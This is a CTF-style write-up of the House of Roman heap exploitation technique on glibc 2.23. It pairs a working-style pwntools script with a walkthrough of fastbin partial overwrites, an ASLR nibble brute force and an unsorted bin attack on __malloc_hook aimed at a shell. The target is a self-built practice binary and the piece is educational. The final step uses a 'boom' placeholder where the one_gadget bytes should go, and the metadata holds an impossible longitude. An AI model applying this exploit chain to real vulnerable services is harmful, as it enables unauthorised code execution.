---
title: "House of Roman — Leakless Exploitation via Fastbin and Unsorted Bin Attacks on glibc 2.23"
ctf: "leakless"
category: "pwn"
difficulty: "easy"
points: null
date: "2026-06-22"
lat: -60.71
lng: 1700
summary: "Leveraging glibc 2.23 mechanisms to build a fastbin chain pointing near __malloc_hook, using a 4-bit ASLR brute-force, and executing an unsorted bin attack to write a libc address without an information leak."
tags:
  - "heap"
  - "fastbin"
  - "unsortedbin"
  - "house-of-roman"
  - "partial-overwrite"
  - "glibc-2.23"
---
```python
#!/usr/bin/env python3

from pwn import *
import os

exe = ELF("./house_of_roman")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = exe
context.arch = "amd64"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)
    return r


count = -1
def malloc(idx, size):
    global count
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Index: ", str(idx).encode())
    r.sendlineafter(b"Size: ", str(size).encode())
    count+=1
    return count

def free(idx):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"Index: ", str(idx).encode())


def edit(idx, off, data):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"Index: ", str(idx).encode())
    r.sendlineafter(b"Offset: ", str(off).encode())
    r.sendlineafter(b"Length: ", str(len(data)).encode())
    r.sendafter(b"Data: ", data)


def main(f):
    global r
    r = conn()
```
    I just finished setting up the helper functions. I built this challenge without any
    print functions to learn the House of Roman technique. Instead of patching a     
    modern glibc like we did for House of Force, I decided to go back to an older 
    version to see how the allocator used to work. I chose glibc 2.23. It is very old,
    and I don't know much about it yet, so let's explore it together!

    At first, I thought I would need to fill the tcache, but I quickly realized there 
    is no tcache here at all! That is not a joke; it's real. If you allocate a 0x60 
    chunk, it goes straight to the fastbins. If you allocate an 0x80 chunk, it goes to
    the unsorted bin. This feels a bit strange to me, but I really like it.

    With this technique, we will use fastbins and the unsorted bin to get a chunk 
    allocated at __malloc_hook without needing any memory leaks. This is possible 
    because 
    glibc 2.23 does not have Safe Linking on the fastbins. I have to say, I love this 
    version!

    First, let's allocate our chunks.

```python
    chunkA = malloc(0,0x60)
    guard  = malloc(1,0x80)
    chunkC = malloc(2,0x80)
    chunkB = malloc(3,0x60)
```
    Here, we need to free chunkC and then allocate it again with the same size as
    chunkA. Why do we do this? I think we need to look at the full picture of the 
    attack to completely understand, but the short answer is that we need to force 
    glibc to write the main_arena address into chunkC fd and bk pointers. This 
    gives us a libc address inside the chunk, which we will need later.

    So now we have:
      chunkC
    fd    / bk 
    arena  arena

    Even though it is currently an active, allocated chunk, the libc pointers remain 
    inside it. You can ignore the rest of the remaining space for now.
```python
    free(chunkC)
    chunkC = malloc(4,0x60)
```
    We have successfully set up the fastbin list so that chunkA->fd points to chunkB.
```python
    free(chunkB)
    free(chunkA)
```

```text
    The fastbin layout looks like this:

    Chunk A                     
  +------------+              +------------+
  |  0  | 0x61 |              |  0  | 0x61 |
  +------------+              +------------+
  |  fd |  bk  |              |  fd |  bk  |
  +--|---------+              +------------+
     |                              |
     +---------------------->     Chunk B

Now, we need to partially overwrite the lowest two bytes of chunkC fd pointer to 
make it point near __malloc_hook. I know many details are missing right now, but bear 
with me; the full picture will become completely clear by the end of the exploit 
explanation.
```
```python
    low2 = (libc.symbols['__malloc_hook'] - 0x23 + (f <<12)) & 0xffff
    edit(chunkC,0,p16(low2))
```
    We are brute-forcing the last nibble here because of ASLR. However, it is a small 
    guess and not very difficult to pull off. Once our partial overwrite succeeds, 
    chunkC fd pointer will successfully contain the address near __malloc_hook. 
    From there, we can chain it directly into our fastbin list.

```python
    edit(0,0,b"\x00")
```
```text
The fastbin layout now looks like this:
    
 fastbin[0x60]
     |
     v
+----------+     fd      +----------+     fd      +---------------+
| chunkA   | ----------> | chunkC   | ----------> | __malloc_hook |
+----------+             +----------+             +---------------+


We can navigate this chain by calling malloc to clear ChunkA, then ChunkC. The next 
allocation will then return our target address near __malloc_hook. 

However, the memory around __malloc_hook is empty, and we do not have a leak to 
calculate an explicit payload. We need a way to write a valid libc address into 
__malloc_hook itself. We can achieve this by forcing glibc to write an address there 
using an unsorted bin attack, which is the easiest route. First, let's trigger the 
allocations to get our target chunk back from malloc.
```

```python
    chunkA = malloc(5,0x60)
    chunkB = malloc(6,0x60)
    target = malloc(7,0x60)
```

    Okay, now let's allocate chunkD with a size of 0x80 to place it in the unsorted bin.
    We will then free it and abuse the unlinking mechanism when it is allocated again. 

    When a chunk is removed from the unsorted bin, the allocator performs the following operation:
    
    fwd->bk = bck (or bck->fd = fwd)

    While chunkD is free in the unsorted bin, both its fd and bk pointers point back 
    to the main_arena. We will partially overwrite the bk pointer so that:

    bk = __malloc_hook - 0x10

    When we call malloc to request this chunk again, the unlinking process will 
    execute the write for us:

    bk->fd = main_arena_address (which translates to: __malloc_hook = main_arena_address)

    In this way, we successfully write a valid libc address directly into 
    __malloc_hook. Since the hook now contains a libc pointer, we can partially 
    overwrite it one more time to turn it into a one_gadget address!

```python
    chunkD = malloc(8,0x80)
    guard  = malloc(9,0x30)

    free(chunkD)
    
    low2 = (libc.symbols['__malloc_hook']- 0x10 + (f<<12)) & 0xffff
    edit(chunkD,8,p16(low2))

    chunkD = malloc(10,0x80)
```
    We are finally done! Now that we have a valid libc address sitting inside 
    __malloc_hook, we can perform a final partial overwrite. By changing the lower 
    bytes to point to our one_gadget offset, the next malloc call will trigger the hook and grant us a shell.
```python
    edit(target,0x13,b"boom")
    malloc(11,0x60)
    r.interactive()

if __name__ == "__main__":
    
    for i in range(0x10):
        try:
            main(i)
        except:
            pass
```